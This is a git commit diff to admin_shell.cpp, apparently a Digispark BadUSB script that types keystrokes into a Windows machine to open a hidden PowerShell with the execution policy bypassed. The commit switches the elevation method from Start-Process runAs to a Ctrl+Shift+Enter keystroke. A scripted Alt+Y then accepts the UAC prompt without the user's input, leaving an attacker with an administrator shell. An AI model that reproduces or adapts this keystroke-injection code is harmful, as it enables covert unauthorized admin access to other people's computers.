98b38dc2e6b4936859ceaed8ac4aa22730d50d3e
Xre0uS <hello@xre0us.io>
2025-03-23 17:15:28 +0800

    Update admin_shell.cpp

--- admin_shell.cpp
+++ admin_shell.cpp
@@ -6,9 +6,8 @@ void setup()
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.println("powershell -ExecutionPolicy Bypass -WindowStyle hidden"); 
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Start-Process -ExecutionPolicy Bypass -WindowStyle hidden -WindowStyle powershell -Verb runAs");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(1000);
